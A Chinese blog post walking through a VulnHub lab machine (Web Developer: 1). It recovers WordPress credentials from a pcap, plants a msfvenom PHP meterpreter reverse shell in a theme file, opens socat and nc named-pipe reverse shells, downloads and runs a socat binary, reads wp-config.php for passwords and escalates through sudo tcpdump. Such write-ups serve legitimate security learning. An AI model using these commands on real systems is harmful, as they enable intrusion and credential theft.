# 胡言乱语

一整个五一光在家里弄Python数据可视化和靶机渗透这上面了，很遗憾的是，Python数据分析这一块卡在了某个数据的爬取上，导致整个程序都有问题，又不太想跳过这部分的数据，怕影响整体的分析，所以就约等于"浪费"了时间，倒是花了一下午整出了个靶机，还挺好玩的

# 靶机下载地址(需梯子)

https://www.vulnhub.com/entry/web-developer-1,288/

# 环境

靶机IP: 192.168.40.129 Kali Linux IP: 192.168.40.135

# 渗透过程

按照靶机莫得IP理论，开始之前都得用扫描工具来探测主机存活性，例如nmap或者netdiscover这些 扫描到靶机的IP为192.168.40.129，开放ssh和http服务，挨个访问一遍   

![](../Images/663fb64edb278af23644eab71bfbd3b4.png)

  

逛了一圈，看了看网页源代码，并没有看到什么乱七八糟的内容，很遗憾，打开kali，开始后台爆破

![](../Images/e6a08e0190d5b61037dadedf5f83505a.png)

这里要注意一点，扫描后台的时候得带上字典，用软件自身自带的字典扫不出什么有用的路径 （一开始没用字典，以至于在扫出来的垃圾上面耗费了大量时间，为自己的愚蠢付出代价）

**字典路径**

```
1.  `/usr/share/dirb/wordlists`
    
```

扫描完成后，发现和之前扫描的结果不同，多了个 `/ipdata/`这个目录

![](../Images/a5593ca05c0f469ea4f97ad74a63a17f.png)

打开发现目录下有一个.cap包，总所周知.cap包是流量包（误）

![](../Images/8bbe9bc09cc2f54d6bb1fc601e237312.png)

下载下来后，导入到wireshark中

![](../Images/f7546f4b1b8a08660d7e3588cc929c07.png)

过滤一下数据包，只看http的包

![](../Images/7de387d48b491e79efe811d2ca4a657a.png)

在茫茫数据包中，发现有一个成功的302页面跳转，所以判断前面输入了账号密码，打开上面一个包，查看发送的数据，发现账号密码在里面  

![](../Images/961c39478145efaae9469ef042b6e51f.png)

这里插入个题外话。我一开始在别的地方获取到了用户名，通过文章-作者名这一块找到了名字，接着在wordpress的忘记密码中确认了改用户名存在，于是去爆破，看到数据包中的密码后才意识到自己去爆破密码的行为有多蠢。  

回到正题，获取到了用户名密码后，去到登录界面

![](../Images/3e20625e2c0c08f6006b8b9df4926b89.png)

登录成功后，就得了想办法从网站后台进入系统了

![](../Images/41b1a7189d933183301cc38a63c5738d.png)

**总体的思路有三种**  

    1.通过网站后台修改页面内容，插入木马语句，反弹shell

    2.通过网站后台上传木马文件，反弹shell     3.通过某个0day远程执行命令  

  

第二种方法我没找到上传点，而第三种方法我也没找着啥0day（也许是我太辣鸡了），所以只能用第一种方法

左侧工具栏找到Appearance-Editor来编辑页面文件，我这里挑了个404的php文件，比较好找

![](../Images/13e779fb5d15c183a3daf8b02d4cd75d.png)

前面通过burpsuite扫子目录的时候找到了主题所在的目录，但当前网站有三个主题，所以后面触发木马的时候要注意主题路径

![](../Images/9df3603eb30a77a09f7d1f37ac191d05.png)

其实理论来说，404.php中插入一句话木马也是可以的，但是不知道为什么我触发的时候有问题，所以就又到了我最爱的借助 `msfvenom`生成php木马的时间了

```
1.  `msfvenom --payload php/meterpreter/reverse_tcp LHOST=192.168.40.129 LPORT=4123 --format raw --out /etc/Elapse.php`
    
```

生成成功后，用编辑器打开，复制粘贴到页面中，覆盖成404.php

![](../Images/6ccb6c5a45355098d0c53531ad207221.png)

生成php

![](../Images/13d7c3336a0cbd1cd4ef5a61eee87dde.png)

更新404.php

完成后，打开msfconfig，开启监听，设置好payload后，exploit启动，回到浏览器，回车触发php木马，这时候metasploit就接收到了shell

![](../Images/57dbbcde0b692ef32d683895b57e7883.png)

  

比较坑的是，这台靶机没有python，所以不能直接转到命令终端中去，而su root这个命令只允许在终端上进行，百度了一下，找到了个新方法

![](../Images/f9178a28e58383f78c5ec5ecdb4c2a5e.png)

无法用python直接转tty  

在Kali中输入以下命令开启监听

```
1.  ``socat file:`tty`,raw,echo=0 tcp-listen:4444``
    
```

然后在靶机输入

```
1.  `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`
    
```

如果靶机没有socat的话，可以去github上下载，下面这个是万金油命令

```
1.  `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.40.129:5555`
    
```

回车运行后，Kali这边就收到了反弹的shell，只不过这个是控制台的

![](../Images/a1130f8f6f79a24f648e1607cc5d33dc.png)

进入到 `/etc/`目录后， `cat passwd`，发现系统中有一个用户webdeveloper是可以登录的

![](../Images/ce4e3fb3d80cb24d5d6591449c080cac.png)

/etc/passwd

  

  

所以回到 `/var/www/html/`中查找wp-config.php这个配置文件

  

![](../Images/abe0139f684ae3a6f86d06c291b538f6.png)

/var/www/html/wp-config.php

打开配置文件后，获取到了用户密码，通过ssh连接上去

![](../Images/8eb749f039d145ed70fbe916e23cdfe5.png)

进入后，尝试sudo su，发现不给用，sudo -l发现自己只能用root权限去执行tcpdump这个命令，但是已经足够了

![](../Images/d6bcdb735c7d1f8a3153a8b84cd2c0f7.png)

百度找到tcpdump提权的方法后，进入 `/tmp/`目录写一个sh脚本

```
1.  `mknod elapse p && nc 192.168.40.129 6666 0<elapse | /bin/bash 1>elapse`
    
```

wq保存后, `chmod777<文件名>`赋予执行的权限，kali这边记得开启nc监听

```
1.  `nc -lvnp 6666`
    
```

  

![](../Images/2a186a2e3c213a4500d066b85b7a66ae.png)

然后回到靶机上，触发木马回弹shell，获取成功后，id查看一下，权限是root了

cat命令查看/root/下的flag文件，完成

![](../Images/66cd943475bf631d759b799e4cb77fdf.png)
